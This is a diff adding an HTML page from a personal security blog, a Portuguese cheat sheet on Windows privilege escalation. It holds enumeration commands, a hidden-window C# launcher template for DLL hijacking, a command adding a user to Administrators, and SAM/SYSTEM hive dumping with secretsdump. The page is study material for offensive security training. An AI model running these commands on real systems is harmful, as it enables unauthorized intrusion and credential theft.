@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Windows Privilege Escalation — cheat sheet | lucas.albino</title>
+<meta name="description" content="Cheat sheet de escalonamento de privilégios em Windows: enumeração, serviços, ACLs, scheduled tasks, DLL hijacking e dump de hashes.">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' rx='18' fill='%230a0e13'/><text y='68' x='50' text-anchor='middle' font-size='58' font-family='monospace' fill='%23ff2b3d'>&gt;_</text></svg>">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+
+<nav class="nav">
+  <div class="wrap nav-in">
+    <a class="brand" href="../index.html"><span class="sig">&gt;_</span> lucas<span class="sig">.</span>albino</a>
+    <button class="nav-toggle" aria-label="Abrir menu" aria-expanded="false">&#9776;</button>
+    <div class="nav-links">
+      <a href="../index.html#sobre">./sobre</a>
+      <a href="../index.html#exp">./exp</a>
+      <a href="../index.html#labs">./labs</a>
+      <a href="../writeups.html" class="active">./writeups</a>
+      <a href="../index.html#contato">./contato</a>
+    </div>
+  </div>
+</nav>
+
+<article class="article">
+  <div class="wrap prose">
+    <a class="back" href="../writeups.html">&larr; writeups</a>
+
+    <div class="article-head">
+      <div class="post-meta">
+        <span>ago 2026</span>
+        <span class="chip ad">Windows</span>
+        <span class="chip red">Privilege Escalation</span>
+        <span>cheat sheet</span>
+      </div>
+      <h1>Windows Privilege Escalation — cheat sheet</h1>
+      <p style="color:var(--txt-dim);margin:0">
+        Enumeração e vetores comuns de escalonamento de privilégios em Windows via CMD e PowerShell:
+        serviços, permissões, scheduled tasks, DLL hijacking e dump de hashes.
+      </p>
+    </div>
+
+    <div class="disclosure">
+      <strong>// disclaimer</strong><br>
+      Conteúdo criado exclusivamente para fins educacionais e de estudo em segurança ofensiva.
+      Usar estas técnicas em sistemas sem autorização prévia é ilegal.
+    </div>
+
+    <h2>1. Enumeração básica</h2>
+    <h3>Identidade e privilégios</h3>
+    <pre><code>whoami
+whoami /priv            # Mostra os privilégios do usuário
+whoami /all             # Informações completas do usuário</code></pre>
+
+    <h3>Usuários e grupos</h3>
+    <pre><code>net user                # Lista usuários da máquina
+net user &lt;usuario&gt;       # Detalhes de um usuário
+net localgroup          # Lista grupos locais
+
+net localgroup "Remote Desktop Users"
+net localgroup Administrators</code></pre>
+
+    <h2>2. Arquivos e diretórios</h2>
+    <h3>Arquivos ocultos</h3>
+    <pre><code># CMD
+dir /a
+
+# PowerShell
+Get-ChildItem -Force
+dir -Force</code></pre>
+
+    <h3>Busca recursiva (equivalente ao <code>find</code> do Linux)</h3>
+    <pre><code>Get-ChildItem -Path "C:\Program Files" -Recurse -Force
+
+# Ignorar erros: -ErrorAction SilentlyContinue
+Get-ChildItem -Path "C:\Program Files\Corporate Tools" -Recurse -Force -ErrorAction SilentlyContinue</code></pre>
+
+    <h2>3. Busca de conteúdo (equivalente ao <code>grep</code>)</h2>
+    <pre><code># Contar linhas
+Get-Content .\events.csv | Measure-Object
+
+# Buscar palavra específica
+Get-Content .\events.csv | Select-String "palavra"
+Select-String -Path .\events.csv -Pattern "palavra"</code></pre>
+
+    <h2>4. Registro do Windows</h2>
+    <pre><code># Listar chaves específicas
+Get-ChildItem "HKLM:\SOFTWARE\CorporateApps\"
+
+# Buscar recursivamente
+Get-ChildItem "HKLM:\SOFTWARE" -Recurse -ErrorAction SilentlyContinue |
+  Get-ItemProperty -ErrorAction SilentlyContinue |
+  Where-Object { $_ -match "string_desejada" }
+
+# Alternativa via CMD
+reg query &lt;chave&gt;</code></pre>
+
+    <h2>5. Permissões (ACL)</h2>
+    <pre><code># CMD
+icacls &lt;arquivo&gt;
+
+# PowerShell
+Get-Acl .\arquivo.txt | Format-List</code></pre>
+
+    <h2>6. Arquivos interessantes</h2>
+    <pre><code># Buscar backups
+dir C:\ -Recurse -Filter "*.bak" -ErrorAction SilentlyContinue | Select-Object FullName
+
+# Sempre verificar permissões
+icacls &lt;arquivo&gt;</code></pre>
+
+    <h2>7. Execução como outro usuário (equivalente ao <code>su</code>)</h2>
+    <pre><code>runas /user:svcadmin powershell
+
+# Alternativa: RunasCs (executa sem prompt interativo de senha)</code></pre>
+
+    <h2>8. Scheduled tasks</h2>
+    <pre><code># CMD
+schtasks /query /fo List /v
+schtasks /query /fo List /v | findstr &lt;nome&gt;
+
+# PowerShell
+Get-ScheduledTask</code></pre>
+
+    <h2>9. Serviços</h2>
+    <pre><code># CMD
+sc qc NomeDoServico
+
+# PowerShell
+Get-CimInstance Win32_Service -Filter "Name='NomeDoServico'"
+
+# Serviços rodando
+Get-CimInstance Win32_Service | Where-Object { $_.State -eq "Running" }
+
+# Exibir Path do serviço
+Get-CimInstance Win32_Service -Filter "Name='NomeDoServico'" | Select-Object Name, PathName</code></pre>
+
+    <h2>10. Enumeração de portas locais</h2>
+    <pre><code>netstat -ano
+Get-NetTCPConnection
+
+# Testar endpoint local
+iwr -uri http://127.0.0.1:PORTA
+iwr -uri http://127.0.0.1:PORTA -UseBasicParsing</code></pre>
+
+    <h2>11. DLL hijacking (conceito)</h2>
+    <p>Condições a verificar:</p>
+    <ul>
+      <li>Serviço rodando como LocalSystem</li>
+      <li>Permissões fracas na pasta do serviço</li>
+      <li>DLL ausente no diretório de execução</li>
+    </ul>
+    <p>Exemplo de estrutura básica de DLL maliciosa (C#):</p>
+    <pre><code>using System;
+using System.Diagnostics;
+
+public class Helper
+{
+    public static void Init()
+    {
+        Process.Start(new ProcessStartInfo
+        {
+            FileName = "cmd.exe",
+            Arguments = "/c comando_aqui",
+            WindowStyle = ProcessWindowStyle.Hidden,
+            CreateNoWindow = true
+        });
+    }
+}</code></pre>
+    <p><strong>Exemplo de comando</strong> — adiciona um usuário ao grupo de administradores:</p>
+    <pre><code>/c net localgroup Administrators svcadmin /add
+
+# PowerShell com privilégios elevados
+Start-Process powershell -Verb runAs</code></pre>
+
+    <h2>12. Dump de hashes</h2>
+    <pre><code># Salvar hives do registro
+reg save HKLM\SECURITY C:\Temp\security.save
+reg save HKLM\SYSTEM   C:\Temp\system.save
+reg save HKLM\SAM      C:\Temp\sam.save
+
+# Extração offline
+impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
+
+# Habilitar Restricted Admin
+reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0</code></pre>
+
+    <h2>Checklist mental — Windows PrivEsc</h2>
+    <ul>
+      <li>Verificar privilégios (<code>whoami /priv</code>)</li>
+      <li>Ver grupos administrativos</li>
+      <li>Buscar arquivos de backup</li>
+      <li>Procurar credenciais em arquivos</li>
+      <li>Enumerar serviços</li>
+      <li>Verificar permissões fracas (<code>icacls</code>)</li>
+      <li>Analisar scheduled tasks</li>
+      <li>Ver portas locais</li>
+      <li>Checar registry</li>
+      <li>Avaliar possibilidade de DLL hijacking</li>
+    </ul>
+
+    <p style="margin-top:40px">
+      <a class="back" href="../writeups.html">&larr; voltar para writeups</a>
+      &nbsp;·&nbsp;
+      <a href="https://github.com/LucasRAlbino/The-Hacking-Lab/tree/main/Privilege%20Escalation/Windows" target="_blank" rel="noopener">fonte no GitHub &nearr;</a>
+    </p>
+  </div>
+</article>
+
+<footer>
+  <div class="wrap foot-in">
+    <span>&copy; <span id="year">2026</span> lucas rodrigues albino</span>
+    <span>Campina Grande, PB · BR</span>
+    <span><a href="../index.html">início</a></span>
+  </div>
+</footer>
+
+<script src="../assets/js/main.js"></script>
+</body>
+</html>
